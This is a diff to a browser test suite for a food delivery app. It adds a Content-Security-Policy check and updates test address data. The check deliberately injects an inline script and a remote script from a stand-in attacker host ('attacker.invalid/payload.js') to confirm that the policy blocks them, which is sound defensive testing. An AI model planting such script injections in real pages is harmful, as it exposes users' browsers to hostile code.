@@ -3,7 +3,7 @@
 import { createRequire } from "node:module";
 import { mkdtemp, writeFile, readFile, readdir } from "node:fs/promises";
 import http from "node:http";
-import { fileURLToPath } from "node:url";
+import { fileURLToPath, pathToFileURL } from "node:url";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import assert from "node:assert/strict";
@@ -102,8 +102,11 @@ await writeFile(
   '<!doctype html><html><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="/app.css"><div id="root"></div><script type="module" src="/app.js"></script></html>',
 );
 await writeFile(target + "/logo.svg", await readFile(root + "/artifacts/localeats/public/logo.svg"));
+await build({ entryPoints: [root + '/artifacts/api-server/src/lib/security-headers.ts'], outfile: target + '/security.mjs', bundle: true, platform: 'node', format: 'esm', logLevel: 'silent' });
+const { contentSecurityPolicy } = await import(pathToFileURL(target + '/security.mjs'));
 const server = http.createServer(async (req, res) => {
   try {
+    res.setHeader('Content-Security-Policy', contentSecurityPolicy({ NODE_ENV: 'test' }));
     const file = req.url === "/logo.svg" ? "logo.svg" :
       req.url === "/app.js"
         ? "app.js"
@@ -133,6 +136,24 @@ try {
     args: ["--no-sandbox"],
   });
   const origin = "http://127.0.0.1:" + server.address().port;
+  const cspPage = await browser.newPage({ viewport: { width: 390, height: 844 } });
+  await cspPage.goto(origin + '/?checkoutCsp=true');
+  await cspPage.getByRole('button', { name: 'Prepare secure test payment', exact: true }).waitFor();
+  await cspPage.evaluate(() => {
+    window.cspViolations = [];
+    document.addEventListener('securitypolicyviolation', event => window.cspViolations.push(event.effectiveDirective));
+    const script = document.createElement('script'); script.textContent = 'window.injectedScriptRan = true'; document.body.append(script);
+    const remote = document.createElement('script'); remote.src = 'https://attacker.invalid/payload.js'; document.body.append(remote);
+  });
+  await cspPage.waitForFunction(() => window.cspViolations.length >= 2);
+  assert.equal(await cspPage.evaluate(() => window.injectedScriptRan), undefined);
+  assert.ok((await cspPage.evaluate(() => window.cspViolations)).every(value => value === 'script-src-elem'));
+  await cspPage.route('https://checkout.stripe.com/**', route => route.fulfill({ contentType: 'text/html', body: '<h1>Simulated Stripe TEST redirect</h1>' }));
+  await cspPage.getByRole('button', { name: 'Prepare secure test payment', exact: true }).click();
+  await cspPage.getByRole('button', { name: 'Open Stripe test checkout', exact: true }).click();
+  await cspPage.getByRole('heading', { name: 'Simulated Stripe TEST redirect', exact: true }).waitFor();
+  await cspPage.close();
+  console.log('CSP browser PASS: real CheckoutPanel loads under enforced policy; inline/foreign scripts blocked; hosted Stripe redirect preserved with intercepted provider navigation, no transaction.');
   const reconciliation = await browser.newPage({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
   await reconciliation.goto(origin + '/?reconciliation=true');
   await reconciliation.getByLabel('Review reason', { exact: true }).fill('Review existing completed test order');
@@ -491,7 +512,7 @@ try {
   await guestPage
     .getByLabel("Street address", { exact: true })
     .fill("QA guest street");
-  await guestPage.getByLabel("City", { exact: true }).fill("Kingston");
+  await guestPage.getByLabel("City", { exact: true }).fill("Rockwood");
   await guestPage.getByLabel("ZIP code", { exact: true }).fill("37854");
   await guestPage
     .getByRole("button", { name: "Save address", exact: true })
@@ -623,7 +644,7 @@ try {
     ["Configured tax rate (%)", "0"],
     ["Restaurant commission (%)", "10"],
     ["Driver share of delivery fee (%)", "100"],
-    ["Delivery ZIP codes, separated by commas", "37763"],
+    ["Delivery ZIP codes, separated by commas", "37854"],
   ])
     await page.getByLabel(label, { exact: true }).fill(value);
   await page
@@ -644,7 +665,7 @@ try {
       restaurantCommissionBps: 1000,
       driverShareBps: 10000,
       taxDeliveryAndService: false,
-      allowedPostalCodes: ["37763"],
+      allowedPostalCodes: ["37854"],
       testMode: true,
     },
   ]);
